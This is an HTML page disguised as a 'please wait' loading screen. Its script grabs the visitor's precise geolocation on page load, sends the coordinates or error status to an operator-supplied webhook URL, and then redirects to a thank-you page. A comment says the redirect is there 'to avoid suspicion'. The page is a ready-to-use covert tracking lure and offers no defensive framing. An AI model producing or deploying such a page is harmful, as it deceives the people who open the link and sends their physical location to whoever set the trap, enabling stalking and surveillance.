<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f0f0f0; color: #333; }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #7983ff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
    <script>
        // !!! IMPORTANT: Replace this with your actual Webhook.site URL from Part 2 !!!
        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
        const FINAL_REDIRECT_URL = 'https://example.com/thank_you_page.html'; // Where the user goes after the attempt

        function sendDataToWebhook(data) {
            const params = new URLSearchParams(data).toString();
            // We use fetch to send data without navigating away immediately,
            // allowing us to then redirect the user to FINAL_REDIRECT_URL.
            fetch(`${WEBHOOK_URL}?${params}`, {
                method: 'GET', // Webhooks often expect GET for simple query params
                mode: 'no-cors' // Required for sending to external webhooks from GitHub Pages
            }).then(() => {
                // Data sent (or attempt made), now redirect the user
                window.location.href = FINAL_REDIRECT_URL;
            }).catch(e => {
                console.error("Failed to send data to webhook:", e);
                // Even if webhook fails, redirect the user to avoid suspicion
                window.location.href = FINAL_REDIRECT_URL;
            });
        }

        function attemptGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        sendDataToWebhook({ lat: lat, lon: lon, status: 'success' });
                    },
                    function(error) {
                        let status = 'denied_or_error';
                        if (error.code === error.PERMISSION_DENIED) { status = 'permission_denied'; }
                        else if (error.code === error.POSITION_UNAVAILABLE) { status = 'position_unavailable'; }
                        else if (error.code === error.TIMEOUT) { status = 'timeout'; }
                        sendDataToWebhook({ status: status, error_code: error.code, error_message: error.message });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            } else {
                sendDataToWebhook({ status: 'unsupported' });
            }
        }

        window.onload = attemptGeolocation;
    </script>
</head>
<body>
    <div class="spinner"></div>
    <p>Please wait while we prepare your content...</p>
    <noscript>
        <p>This page requires JavaScript to function. Please enable it or try a different browser.</p>
    </noscript>
</body>
</html>
